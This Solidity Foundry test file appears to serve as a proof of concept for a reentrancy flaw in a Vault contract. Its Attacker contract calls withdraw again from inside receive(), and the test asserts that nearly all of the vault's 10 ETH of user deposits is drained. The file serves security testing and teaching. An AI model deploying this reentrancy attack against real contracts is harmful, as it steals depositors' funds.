// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";

contract Attacker {
    Vault public vault;
    uint256 public constant AMT = 1 ether;
    uint256 public reentries;

    constructor(Vault _v) {
        vault = _v;
    }

    function attack() external {
        vault.deposit{value: AMT}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= AMT) {
            reentries++;
            vault.withdraw();
        }
    }
}

contract VaultReentrancyTest is Test {
    Vault vault;
    Attacker attacker;

    function setUp() public {
        vault = new Vault();

        // Honest users deposit 10 ETH of victim funds.
        for (uint160 i = 1; i <= 5; i++) {
            address user = address(i);
            vm.deal(user, 2 ether);
            vm.prank(user);
            vault.deposit{value: 2 ether}();
        }
        assertEq(address(vault).balance, 10 ether);

        attacker = new Attacker(vault);
        vm.deal(address(attacker), 1 ether);
    }

    function testReentrancyDrainsVault() public {
        uint256 vaultBefore = address(vault).balance;
        console.log("vault balance before:", vaultBefore);

        attacker.attack();

        uint256 attackerBal = address(attacker).balance;
        console.log("attacker balance after:", attackerBal);
        console.log("vault balance after:", address(vault).balance);

        // Attacker deposited 1 ETH and walked away with nearly the whole vault.
        assertGt(attackerBal, 10 ether);
        assertLt(address(vault).balance, 1 ether);
        assertGt(attacker.reentries(), 0);
        assertEq(attackerBal - 1 ether, vaultBefore - address(vault).balance);
    }
}

